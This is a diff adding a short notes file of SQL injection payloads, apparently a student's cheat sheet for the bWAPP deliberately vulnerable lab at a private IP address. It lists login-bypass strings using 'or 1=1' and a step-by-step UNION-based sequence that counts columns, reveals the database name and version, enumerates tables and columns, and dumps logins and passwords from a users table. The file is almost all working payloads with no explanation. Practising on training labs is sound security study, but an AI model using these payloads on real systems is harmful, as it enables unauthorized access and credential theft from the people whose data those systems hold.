@@ -1,0 +1,32 @@
+SQL Injection (Login Form)
+
+
+login=alice'or&password='or 1=1&form=submit
+
+login=thor'or&password='or 1=1&form=submit
+
+login=0' or 1=1 -- -or&password=0' or 1=1 -- -&form=submit
+
+
+
+
+
+
+
+SQL Injection (Search/GET)
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' order by 8-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,5,6,7-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,database(),6,7-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,version(),6,7-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,table_name,6,7 from information_schema.tables where table_schema=database()-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,column_name,6,7 from information_schema.columns where table_name="users"-- -
+
+http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,group_concat(login,password),6,7 from users-- -
